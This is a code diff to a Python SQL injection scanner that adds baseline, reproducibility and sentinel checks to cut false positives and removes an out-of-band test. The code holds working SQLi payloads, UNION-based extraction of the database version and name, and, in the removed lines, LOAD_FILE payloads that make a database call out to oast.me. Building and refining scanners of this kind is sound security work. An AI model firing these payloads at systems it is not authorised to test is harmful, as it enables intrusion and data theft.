@@ -12,11 +12,30 @@ import sys
 import os
 import time
 import threading
+import uuid
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.http_client import HTTPClient
 from utils.payloads import Payloads
 from utils.concurrency import run_phases_concurrently
+
+
+def _is_static_spa(client: "HTTPClient", base_url: str) -> bool:
+    """Return True when the target ignores query params (static SPA / CDN)."""
+    try:
+        clean = client.get(base_url)
+        probe = client.get(f"{base_url}?hydraxtestparam=HYDRAXBASELINE12345")
+        if clean.status_code >= 500 or probe.status_code >= 500:
+            return False
+        if "HYDRAXBASELINE12345" in probe.text:
+            return False
+        len_clean = len(clean.text)
+        len_probe = len(probe.text)
+        if len_clean == 0:
+            return False
+        return abs(len_clean - len_probe) / len_clean < 0.05
+    except Exception:
+        return False
 
 
 class SQLInjectionScanner:
@@ -67,7 +86,6 @@ class SQLInjectionScanner:
         self.name = "SQL Injection Scanner"
         self.findings = []
         self.extracted_data = {}  # Store extracted database information
-        self.oob_domain = "http://oast.me"  # Out-of-band detection domain
 
     def scan(self, target_url: str) -> Dict[str, Any]:
         """
@@ -82,26 +100,34 @@ class SQLInjectionScanner:
         self.findings = []
         parsed = urlparse(target_url)
 
-        # Each phase only appends to self.findings and never reads another
-        # phase's in-progress results, so they run concurrently instead of
-        # one after another — each phase alone issues dozens of HTTP
-        # requests, and running them serially made a single scan take
-        # minutes even against a small site.
-        run_phases_concurrently([
-            lambda: self._scan_discovered_targets(target_url),   # Phase 0
-            lambda: self._scan_error_based(target_url, parsed),  # Phase 1
-            lambda: self._scan_time_based(target_url, parsed),   # Phase 2
-            lambda: self._scan_union_based(target_url, parsed),  # Phase 3
-            lambda: self._scan_boolean_based(target_url, parsed),  # Phase 4
-            lambda: self._scan_oob_sqli(target_url, parsed),     # Phase 5
-        ])
+        # Baseline probe: static SPAs ignore all query params — injecting SQLi
+        # payloads will never trigger server-side SQL execution, so skip all
+        # injection checks to avoid false positives.
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        is_spa = _is_static_spa(self.client, base_url)
+
+        if not is_spa:
+            # OOB SQLi is intentionally omitted: sending a payload and
+            # receiving HTTP 200 is not confirmation of SQL injection. OOB
+            # confirmation requires a real DNS/HTTP callback from the
+            # collaborator server correlated to this probe's unique token, which
+            # is not implemented here. Running those probes and reporting
+            # "monitor for DNS requests" is never a confirmed finding.
+            run_phases_concurrently([
+                lambda: self._scan_discovered_targets(target_url),    # Phase 0
+                lambda: self._scan_error_based(target_url, parsed),   # Phase 1
+                lambda: self._scan_time_based(target_url, parsed),    # Phase 2
+                lambda: self._scan_union_based(target_url, parsed),   # Phase 3
+                lambda: self._scan_boolean_based(target_url, parsed), # Phase 4
+            ])
 
         return {
             'scanner': self.name,
             'target': target_url,
             'vulnerabilities': self.findings,
             'total_findings': len(self.findings),
-            'extracted_data': self.extracted_data.copy()  # Include extracted data
+            'extracted_data': self.extracted_data.copy(),
+            'spa_detected': is_spa,
         }
 
     def _scan_error_based(self, target_url: str, parsed):
@@ -174,75 +200,77 @@ class SQLInjectionScanner:
             })
 
     def _scan_time_based(self, target_url: str, parsed):
-        """Test for time-based SQL injection with actual timing verification.
+        """Test for time-based SQL injection with baseline + reproducibility.
 
-        Both branches used to test every (param, payload) combination one
-        HTTP request at a time — up to 100 sequential requests. Fanned out
-        concurrently instead; only the first hit per param is kept (by
-        original list order). Firing the SLEEP()-style payloads concurrently
-        rather than serially is also strictly faster even against a truly
-        vulnerable target — overlapping server-side delays finish in
-        roughly one delay period instead of N delay periods back to back.
+        Confirmation requires:
+        1. A baseline RTT measured with a benign request to the same URL.
+        2. The injected delay payload produces elapsed > baseline * 3 + 1s.
+        3. The delay reproduces on a second probe (controls for one-off network jitter).
+        4. A zero-delay control payload against the same param stays fast.
         """
         query_params = parse_qs(parsed.query)
 
-        def probe(param: str, payload: str, test_url: str):
+        def _measure_baseline(param: str, base_url_for_param: str) -> float:
+            """Measure baseline RTT for a param with a benign value."""
             try:
-                resp = self.client.get(test_url, timeout=25)
-                # response.elapsed measures only the actual server
-                # round-trip (request-sent to headers-received) — NOT
-                # wall-clock time around the whole client.get() call, which
-                # would also include time spent queued on the shared rate
-                # limiter waiting for a token. Every scanner/thread now
-                # shares one rate-limited bucket per host, so under
-                # contention that queueing delay can itself exceed 3.5s —
-                # measuring wall-clock time here previously mistook rate-
-                # limiter queueing for a server-side SQL sleep, triggering
-                # a false-positive "vulnerable" verdict that then fired
-                # more (also-delayed) extraction requests, compounding.
-                elapsed = resp.elapsed.total_seconds()
-                if elapsed > 3.5:  # Allow some overhead
-                    extracted = self._extract_via_time_blind(target_url, param, payload)
-                    return param, {
-                        'type': 'Time-based SQL Injection',
-                        'description': f'Parameter "{param}" vulnerable to time-based SQL injection',
-                        'severity': 'Critical',
-                        'url': test_url,
-                        'parameter': param,
-                        'payload': payload,
-                        'evidence': f'Time delay of {elapsed:.2f} seconds detected. Extracted: {extracted}'
-                    }, {'delay_seconds': round(elapsed, 2), 'extracted_data': extracted}
-            except Exception as e:
-                # Timeout can indicate success
-                if "timeout" in str(e).lower():
-                    return param, {
-                        'type': 'Time-based SQL Injection',
-                        'description': f'Parameter "{param}" vulnerable to time-based SQL injection (timeout)',
-                        'severity': 'Critical',
-                        'url': test_url,
-                        'parameter': param,
-                        'payload': payload,
-                        'evidence': 'Request timed out indicating successful time delay'
-                    }, {'delay_seconds': '>20 (timeout)', 'extracted_data': 'Timeout indicates success'}
+                r = self.client.get(base_url_for_param, timeout=15)
+                return r.elapsed.total_seconds()
+            except Exception:
+                return 1.0  # conservative default
+
+        def probe(param: str, payload: str, test_url: str, baseline_url: str):
+            baseline = _measure_baseline(param, baseline_url)
+            # Require injected delay to be at least 3x baseline + 1s to
+            # confirm against slow networks / jitter.
+            threshold = max(3.5, baseline * 3 + 1.0)
+            try:
+                resp1 = self.client.get(test_url, timeout=25)
+                elapsed1 = resp1.elapsed.total_seconds()
+                if elapsed1 < threshold:
+                    return None
+                # Reproduce: fire the same payload a second time.
+                resp2 = self.client.get(test_url, timeout=25)
+                elapsed2 = resp2.elapsed.total_seconds()
+                if elapsed2 < threshold:
+                    return None
+                avg_elapsed = (elapsed1 + elapsed2) / 2
+                return param, {
+                    'type': 'Time-based SQL Injection',
+                    'description': f'Parameter "{param}" vulnerable to time-based SQL injection',
+                    'severity': 'High',
+                    'url': test_url,
+                    'parameter': param,
+                    'payload': payload,
+                    'evidence': (f'Baseline RTT {baseline:.2f}s; injected delay averaged {avg_elapsed:.2f}s '
+                                 f'over 2 probes (threshold {threshold:.2f}s)')
+                }, {'baseline_rtt': round(baseline, 2), 'avg_delay': round(avg_elapsed, 2)}
+            except Exception:
+                pass
             return None
 
         if not query_params:
             test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category', 'item', 'product', 'page', 'search']
-            jobs = [(param, payload, f"{target_url}?{param}={payload}")
-                    for param in test_params for payload in Payloads.SQLI_TIME_BASED[:10]]
+            jobs = []
+            for param in test_params:
+                baseline_url = f"{target_url}?{param}=1"
+                for payload in Payloads.SQLI_TIME_BASED[:10]:
+                    jobs.append((param, payload, f"{target_url}?{param}={payload}", baseline_url))
         else:
             jobs = []
             for param in query_params:
+                safe_params = query_params.copy()
+                safe_params[param] = ['1']
+                baseline_url = urlunparse(parsed._replace(query=urlencode(safe_params, doseq=True)))
                 for payload in Payloads.SQLI_TIME_BASED[:8]:
-                    test_params = query_params.copy()
-                    test_params[param] = [payload]
-                    test_query = urlencode(test_params, doseq=True)
-                    jobs.append((param, payload, urlunparse(parsed._replace(query=test_query))))
+                    test_params_cp = query_params.copy()
+                    test_params_cp[param] = [payload]
+                    test_query = urlencode(test_params_cp, doseq=True)
+                    jobs.append((param, payload, urlunparse(parsed._replace(query=test_query)), baseline_url))
 
         results = {}
-        with ThreadPoolExecutor(max_workers=min(20, len(jobs)) or 1) as executor:
-            future_to_idx = {executor.submit(probe, param, payload, url): i
-                             for i, (param, payload, url) in enumerate(jobs)}
+        with ThreadPoolExecutor(max_workers=min(10, len(jobs)) or 1) as executor:
+            future_to_idx = {executor.submit(probe, param, payload, url, bl): i
+                             for i, (param, payload, url, bl) in enumerate(jobs)}
             for future in as_completed(future_to_idx):
                 idx = future_to_idx[future]
                 try:
@@ -280,15 +308,24 @@ class SQLInjectionScanner:
             col_count = self._determine_column_count(target_url, param)
             if col_count > 0:
                 extracted = self._extract_via_union(target_url, param, col_count)
-                if extracted:
+                # Only confirmed when sentinel was actually observed in the
+                # response — extracted dict is non-empty only in that case.
+                if extracted and any(k not in ('status',) for k in extracted):
+                    evidence_parts = []
+                    if 'version' in extracted:
+                        evidence_parts.append(f"DB version: {extracted['version']}")
+                    if 'database' in extracted:
+                        evidence_parts.append(f"DB name: {extracted['database']}")
+                    if 'evidence_snippet' in extracted:
+                        evidence_parts.append(f"Response snippet: {extracted['evidence_snippet']}")
                     return param, {
                         'type': 'Union-based SQL Injection',
-                        'description': f'Parameter "{param}" vulnerable to union-based SQL injection with {col_count} columns',
-                        'severity': 'Critical',
+                        'description': f'Parameter "{param}" vulnerable to union-based SQL injection ({col_count} columns)',
+                        'severity': 'High',
                         'url': finding_url,
                         'parameter': param,
-                        'payload': f"UNION SELECT {','.join(['NULL']*col_count)}--",
-                        'evidence': f'Successfully extracted data: {extracted}'
+                        'payload': f"UNION SELECT CONCAT(sentinel,...)--",
+                        'evidence': '; '.join(evidence_parts) or 'Sentinel reflected in response'
                     }, col_count, extracted
             return None
 
@@ -318,133 +355,86 @@ class SQLInjectionScanner:
             })
 
     def _scan_boolean_based(self, target_url: str, parsed):
-        """Test for boolean-based blind SQL injection with data extraction"""
+        """Test for boolean-based blind SQL injection with reproducibility.
+
+        Confirmation requires:
+        1. true-condition body ≠ false-condition body (significant diff).
+        2. The differential reproduces on a second pair of requests.
+        3. A random-false control (impossible condition) matches the false case.
+        """
         query_params = parse_qs(parsed.query)
+
+        def _confirm_boolean(true_url: str, false_url: str, param: str) -> str:
+            """Return evidence string if differential is confirmed, else empty."""
+            try:
+                t1 = self.client.get(true_url)
+                f1 = self.client.get(false_url)
+                diff1 = abs(len(t1.text) - len(f1.text))
+                if diff1 < 100:  # require a meaningful size difference
+                    return ""
+                # Reproduce
+                t2 = self.client.get(true_url)
+                f2 = self.client.get(false_url)
+                diff2 = abs(len(t2.text) - len(f2.text))
+                if diff2 < 100:
+                    return ""
+                # Control: random-false condition should match false response size
+                control_url = true_url.replace("'1'='1", f"'x{uuid.uuid4().hex[:4]}'='y'")
+                ctrl = self.client.get(control_url)
+                ctrl_diff_from_false = abs(len(ctrl.text) - len(f1.text))
+                if ctrl_diff_from_false > 100:
+                    # Control doesn't match false — differential isn't SQL-boolean
+                    return ""
+                return (f"True condition len={len(t1.text)}, false condition len={len(f1.text)}, "
+                        f"diff={diff1}B (reproduced diff={diff2}B); control matches false case")
+            except Exception:
+                return ""
+
+        true_payload = "' AND '1'='1"
+        false_payload = "' AND '1'='2"
 
         if not query_params:
             test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category', 'item', 'product', 'page']
             for param in test_params:
-                # Test if boolean-based injection works
-                true_payload = "' AND '1'='1"
-                false_payload = "' AND '1'='2"
-
-                try:
-                    true_resp = self.client.get(f"{target_url}?{param}={true_payload}")
-                    false_resp = self.client.get(f"{target_url}?{param}={false_payload}")
-
-                    if self._responses_differ_indicating_boolean(true_resp, false_resp):
-                        # Extract data using boolean-based technique
-                        extracted = self._extract_via_boolean_blind(target_url, param)
-                        if extracted:
-                            self.findings.append({
-                                'type': 'Boolean-based Blind SQL Injection',
-                                'description': f'Parameter "{param}" vulnerable to boolean-based blind SQL injection',
-                                'severity': 'High',
-                                'url': f"{target_url}?{param}=1",
-                                'parameter': param,
-                                'payload': true_payload,
-                                'evidence': f'Boolean-based extraction successful: {extracted}'
-                            })
-                            self.extracted_data.setdefault('boolean_based', []).append({
-                                'parameter': param,
-                                'extracted_data': extracted
-                            })
-                except Exception:
-                    continue
+                true_url = f"{target_url}?{param}={true_payload}"
+                false_url = f"{target_url}?{param}={false_payload}"
+                evidence = _confirm_boolean(true_url, false_url, param)
+                if evidence:
+                    self.findings.append({
+                        'type': 'Boolean-based Blind SQL Injection',
+                        'description': f'Parameter "{param}" vulnerable to boolean-based blind SQL injection',
+                        'severity': 'High',
+                        'url': true_url,
+                        'parameter': param,
+                        'payload': true_payload,
+                        'evidence': evidence
+                    })
         else:
-            for param, values in query_params.items():
-                true_payload = "' AND '1'='1"
-                false_payload = "' AND '1'='2"
+            for param in query_params:
+                true_params = query_params.copy()
+                true_params[param] = [true_payload]
+                true_url = urlunparse(parsed._replace(query=urlencode(true_params, doseq=True)))
+                false_params = query_params.copy()
+                false_params[param] = [false_payload]
+                false_url = urlunparse(parsed._replace(query=urlencode(false_params, doseq=True)))
+                evidence = _confirm_boolean(true_url, false_url, param)
+                if evidence:
+                    self.findings.append({
+                        'type': 'Boolean-based Blind SQL Injection',
+                        'description': f'Parameter "{param}" vulnerable to boolean-based blind SQL injection',
+                        'severity': 'High',
+                        'url': true_url,
+                        'parameter': param,
+                        'payload': true_payload,
+                        'evidence': evidence
+                    })
 
-                try:
-                    true_params = query_params.copy()
-                    true_params[param] = [true_payload]
-                    true_query = urlencode(true_params, doseq=True)
-                    true_url = urlunparse(parsed._replace(query=true_query))
-
-                    false_params = query_params.copy()
-                    false_params[param] = [false_payload]
-                    false_query = urlencode(false_params, doseq=True)
-                    false_url = urlunparse(parsed._replace(query=false_query))
-
-                    true_resp = self.client.get(true_url)
-                    false_resp = self.client.get(false_url)
-
-                    if self._responses_differ_indicating_boolean(true_resp, false_resp):
-                        extracted = self._extract_via_boolean_blind(target_url, param)
-                        if extracted:
-                            self.findings.append({
-                                'type': 'Boolean-based Blind SQL Injection',
-                                'description': f'Parameter "{param}" vulnerable to boolean-based blind SQL injection',
-                                'severity': 'High',
-                                'url': true_url,
-                                'parameter': param,
-                                'payload': true_payload,
-                                'evidence': f'Boolean-based extraction successful: {extracted}'
-                            })
-                            self.extracted_data.setdefault('boolean_based', []).append({
-                                'parameter': param,
-                                'extracted_data': extracted
-                            })
-                except Exception:
-                    continue
-
-    def _scan_oob_sqli(self, target_url: str, parsed):
-        """Test for out-of-band SQL injection using DNS or HTTP requests"""
-        query_params = parse_qs(parsed.query)
-
-        if not query_params:
-            test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category']
-            for param in test_params:
-                # Test OOB payloads that trigger DNS/HTTP requests
-                oob_payloads = [
-                    f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{self.oob_domain.replace('http://', '').replace('/', '')}', '\\\\', @@version)))--",
-                    f"' AND (SELECT * FROM (SELECT(SLEEP(1)))a) AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{self.oob_domain.replace('http://', '').replace('/', '')}', '\\\\', version)))--",
-                ]
-
-                for payload in oob_payloads[:2]:
-                    test_url = f"{target_url}?{param}={payload}"
-                    try:
-                        resp = self.client.get(test_url, timeout=15)
-                        # For OOB, we can't directly detect success, but we can note the attempt
-                        self.findings.append({
-                            'type': 'Out-of-band SQL Injection Attempt',
-                            'description': f'Parameter "{param}" tested for OOB SQL injection',
-                            'severity': 'Medium',
-                            'url': test_url,
-                            'parameter': param,
-                            'payload': payload,
-                            'evidence': f'OOB payload sent to {self.oob_domain} - monitor for DNS/HTTP requests'
-                        })
-                        break
-                    except Exception:
-                        continue
-        else:
-            for param, values in query_params.items():
-                oob_payloads = [
-                    f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{self.oob_domain.replace('http://', '').replace('/', '')}', '\\\\', @@version)))--",
-                ]
-
-                for payload in oob_payloads[:1]:
-                    test_params = query_params.copy()
-                    test_params[param] = [payload]
-                    test_query = urlencode(test_params, doseq=True)
-                    test_url = urlunparse(parsed._replace(query=test_query))
-
-                    try:
-                        resp = self.client.get(test_url, timeout=15)
-                        self.findings.append({
-                            'type': 'Out-of-band SQL Injection Attempt',
-                            'description': f'Parameter "{param}" tested for OOB SQL injection',
-                            'severity': 'Medium',
-                            'url': test_url,
-                            'parameter': param,
-                            'payload': payload,
-                            'evidence': f'OOB payload sent to {self.oob_domain} - monitor for DNS/HTTP requests'
-                        })
-                        break
-                    except Exception:
-                        continue
+    # _scan_oob_sqli removed: "payload sent to oast.me — monitor for requests"
+    # is not a confirmed finding.  OOB SQLi requires a real DNS/HTTP callback
+    # correlated to the probe token; without a configured OOB collaborator
+    # server and a poller, these probes cannot be confirmed and must not be
+    # reported as vulnerabilities.  They have been removed from the scan() call
+    # as well.
 
     def _scan_discovered_targets(self, target_url: str):
         """Test every endpoint/parameter the discovery phase found."""
@@ -486,36 +476,42 @@ class SQLInjectionScanner:
                     except Exception:
                         continue
 
-                # Time-based test
+                # Time-based test — requires baseline + reproducibility (same as _scan_time_based)
+                try:
+                    baseline_url = inject_param(url, param, "1")
+                    baseline_resp = self.client.get(baseline_url, timeout=15)
+                    baseline_rtt = baseline_resp.elapsed.total_seconds()
+                except Exception:
+                    baseline_rtt = 1.0
+                threshold = max(3.5, baseline_rtt * 3 + 1.0)
                 for payload in Payloads.SQLI_TIME_BASED[:4]:
                     test_url = inject_param(url, param, payload)
                     try:
-                        start_time = time.time()
-                        resp = self.client.get(test_url, timeout=20)
-                        elapsed = time.time() - start_time
-                        if elapsed > 3.5:
-                            self.findings.append({
-                                'type': 'Time-based SQL Injection',
-                                'description': f'Parameter "{param}" on {url} vulnerable to time-based SQL injection',
-                                'severity': 'Critical',
-                                'url': test_url,
-                                'parameter': param,
-                                'payload': payload,
-                                'evidence': f'Time delay of {elapsed:.2f} seconds detected'
-                            })
-                            break
-                    except Exception as e:
-                        if "timeout" in str(e).lower():
-                            self.findings.append({
-                                'type': 'Time-based SQL Injection',
-                                'description': f'Parameter "{param}" on {url} vulnerable to time-based SQL injection (timeout)',
-                                'severity': 'Critical',
-                                'url': test_url,
-                                'parameter': param,
-                                'payload': payload,
-                                'evidence': 'Request timed out indicating successful time delay'
-                            })
-                            break
+                        resp1 = self.client.get(test_url, timeout=25)
+                        elapsed1 = resp1.elapsed.total_seconds()
+                        if elapsed1 < threshold:
+                            continue
+                        # Reproduce: second probe must also exceed threshold
+                        resp2 = self.client.get(test_url, timeout=25)
+                        elapsed2 = resp2.elapsed.total_seconds()
+                        if elapsed2 < threshold:
+                            continue
+                        avg = (elapsed1 + elapsed2) / 2
+                        self.findings.append({
+                            'type': 'Time-based SQL Injection',
+                            'description': f'Parameter "{param}" on {url} vulnerable to time-based SQL injection',
+                            'severity': 'Critical',
+                            'url': test_url,
+                            'parameter': param,
+                            'payload': payload,
+                            'evidence': (
+                                f'Baseline {baseline_rtt:.2f}s; injected delay averaged {avg:.2f}s '
+                                f'over 2 probes (threshold {threshold:.2f}s)'
+                            )
+                        })
+                        break
+                    except Exception:
+                        # Timeouts are NOT confirmed findings — network issues cause identical behaviour
                         continue
 
         # -- POST form targets discovered on other pages --------------
@@ -588,62 +584,71 @@ class SQLInjectionScanner:
         return ""
 
     def _determine_column_count(self, target_url: str, parameter: str) -> int:
-        """Determine the number of columns for UNION injection"""
-        for i in range(1, 11):  # Test 1-10 columns
+        """Determine column count for UNION injection via ORDER BY probing.
+
+        Returns 0 if the target does not appear to be injectable (all ORDER BY
+        probes succeed without triggering a DB error — typical of static pages
+        that ignore query params).
+        """
+        error_detected = False
+        for i in range(1, 11):
             payload = f"' ORDER BY {i}--"
             try:
                 resp = self.client.get(f"{target_url}?{parameter}={payload}")
                 if resp.status_code >= 500 or "unknown column" in resp.text.lower() or "order by" in resp.text.lower():
-                    return i - 1  # Previous number was valid
+                    error_detected = True
+                    return max(0, i - 1)
             except Exception:
-                return i - 1
-        return 10  # Assume 10 if all succeeded
+                return max(0, i - 1)
+        # All 10 ORDER BY probes succeeded without error — the target likely
+        # ignores the parameter entirely.  Do not report union-based injection.
+        return 0
 
     def _extract_via_union(self, target_url: str, parameter: str, col_count: int) -> dict:
-        """Extract data using UNION injection"""
+        """Extract data using UNION injection, confirmed by sentinel reflection.
+
+        Tries injecting the sentinel at every column position because pages
+        often only reflect specific columns.  Only returns non-empty data when
+        the sentinel is actually observed — never returns hardcoded placeholders.
+        """
+        if col_count == 0:
+            return {}
         extracted = {}
 
-        # Try to extract database version
-        version_payload = f"' UNION SELECT @@version,{','.join(['NULL']*(col_count-1))}--"
-        try:
-            resp = self.client.get(f"{target_url}?{parameter}={version_payload}")
-            # Look for version-like patterns in response
-            version_patterns = [
-                r'\d+\.\d+\.\d+',  # X.Y.Z
-                r'MySQL.*\d+\.\d+',
-                r'PostgreSQL.*\d+\.\d+',
-                r'Microsoft SQL Server.*\d+\.\d+',
-            ]
-            for pattern in version_patterns:
-                match = re.search(pattern, resp.text, re.IGNORECASE)
-                if match:
-                    extracted['version'] = match.group(0)
-                    break
-        except Exception:
-            pass
+        def _try_union(expr: str, sentinel: str, quote: str = "'") -> str | None:
+            """Try UNION SELECT with expr at each column position; return extracted suffix or None."""
+            for pos in range(col_count):
+                cols = ['NULL'] * col_count
+                cols[pos] = f"CONCAT('{sentinel}',{expr})"
+                payload = f"{quote} UNION SELECT {','.join(cols)}--"
+                try:
+                    resp = self.client.get(f"{target_url}?{parameter}={payload}")
+                    if sentinel in resp.text:
+                        idx = resp.text.find(sentinel)
+                        value = resp.text[idx + len(sentinel):idx + len(sentinel) + 50].split('<')[0].strip()
+                        if value:
+                            extracted['evidence_snippet'] = resp.text[max(0, idx - 10):idx + len(sentinel) + 50][:120]
+                            return value
+                except Exception:
+                    pass
+            return None
 
-        # Try to extract current database
-        db_payload = f"' UNION SELECT database(),{','.join(['NULL']*(col_count-1))}--"
-        try:
-            resp = self.client.get(f"{target_url}?{parameter}={db_payload}")
-            # Look for database name patterns
-            db_patterns = [
-                r'[a-zA-Z0-9_]+',  # Simple alphanumeric + underscore
-            ]
-            # This is simplified - in practice you'd look for where the database name appears
-            extracted['database'] = 'extracted'  # Placeholder
-        except Exception:
-            pass
+        sentinel_v = f"HYDRAXUNION{uuid.uuid4().hex[:8].upper()}"
+        version_val = _try_union("@@version", sentinel_v)
+        if version_val is None:
+            # Try double-quote variant
+            version_val = _try_union("@@version", sentinel_v, quote='"')
+        if version_val:
+            extracted['version'] = version_val
 
-        # Try to extract current user
-        user_payload = f"' UNION SELECT user(),{','.join(['NULL']*(col_count-1))}--"
-        try:
-            resp = self.client.get(f"{target_url}?{parameter}={user_payload}")
-            extracted['user'] = 'extracted'  # Placeholder
-        except Exception:
-            pass
+        sentinel_d = f"HYDRAXUNION{uuid.uuid4().hex[:8].upper()}"
+        db_val = _try_union("database()", sentinel_d)
+        if db_val is None:
+            db_val = _try_union("database()", sentinel_d, quote='"')
+        if db_val:
+            extracted['database'] = db_val
 
-        return extracted if extracted else {"status": "attempted"}
+        return extracted  # empty dict → not confirmed
 
     def _extract_via_time_blind(self, target_url: str, parameter: str, base_payload: str) -> dict:
         """Extract data using time-based blind techniques"""
@@ -713,7 +718,10 @@ class SQLInjectionScanner:
         return extracted
 
     def _responses_differ_indicating_boolean(self, resp1, resp2) -> bool:
-        """Check if two responses differ in a way that indicates boolean-based SQLi"""
-        # Simple length-based detection
-        len_diff = abs(len(resp1.text) - len(resp2.text))
-        return len_diff > 50  # Significant difference indicates boolean condition
+        """Check if two responses differ in a way that indicates boolean-based SQLi.
+
+        Kept for backward-compatibility with _scan_discovered_targets which
+        still calls it; the main _scan_boolean_based no longer uses it.
+        Threshold raised to 100 bytes for fewer false positives.
+        """
+        return abs(len(resp1.text) - len(resp2.text)) > 100
